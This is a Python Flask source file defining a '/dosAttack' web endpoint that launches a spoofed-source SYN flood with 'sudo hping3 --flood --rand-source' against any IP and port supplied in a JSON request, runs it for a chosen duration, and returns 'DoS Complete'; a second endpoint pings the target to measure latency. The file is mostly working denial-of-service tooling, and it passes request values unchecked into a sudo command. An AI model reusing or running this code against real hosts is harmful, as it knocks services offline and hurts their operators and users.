from flask import Blueprint, request
import signal
import subprocess
import time

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

@dosAttack.post("/")
def SYNFloodAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = data["portNumber"]
    packetSize = data["packetSize"]
    attackType = data["attackType"]
    duration = int(data["duration"])

    # Get the current time
    start_time = time.time()

    # Calculate the end time by adding the desired duration to the start time
    end_time = start_time + duration

    dosCommand = subprocess.Popen(['sudo', 'hping3', attackType, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
    # pingCommand = subprocess.Popen(['ping', '-i', '5', '-O', ipAddress], stdout=subprocess.PIPE)

    # while time.time() < end_time:
    #     output = pingCommand.stdout.readline()
    #     if pingCommand.poll() is not None:
    #         break
    #     if output:
    #         print('hello ', output.strip())

    time.sleep(duration) # carry out attack for specified duration

    try:
        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
        # pingCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
    except subprocess.TimeoutExpired:
        print('Timeout occured')
    
    dosCommand.kill()
    # pingCommand.kill()

    return "DoS Complete"

@dosAttack.post("/latency")
def checkLatency():
    data = request.get_json()
    ipAddress = data["ipAddress"]

    pingCommand = subprocess.Popen(['ping', '-c', '1', '-w', '2', '-O', ipAddress], stdout=subprocess.PIPE, text=True)
    output, _ = pingCommand.communicate()  # Capture the output and wait for the process to finish

    lines = output.splitlines()
    line = lines[1]

    return line